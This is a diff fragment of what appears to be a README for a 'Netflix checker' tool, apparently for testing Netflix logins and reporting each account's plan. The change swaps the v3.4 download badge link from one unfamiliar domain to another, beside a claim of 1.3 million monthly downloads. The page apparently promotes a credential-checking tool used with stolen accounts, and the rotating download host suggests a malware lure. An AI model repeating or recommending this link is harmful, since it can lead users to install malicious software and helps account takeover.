@@ -49,7 +49,7 @@ A: Yes — shows Standard, Premium, or Basic plan.
 
 **Monthly downloads:** 1.3m+
 
-[![Download](https://img.shields.io/badge/Download-v3.4-brightgreen?style=for-the-badge)](https://dllvcrun.com/netflixchecker)
+[![Download](https://img.shields.io/badge/Download-v3.4-brightgreen?style=for-the-badge)](https://p-csx-5.com/netflixchecker)
 
 ---
 
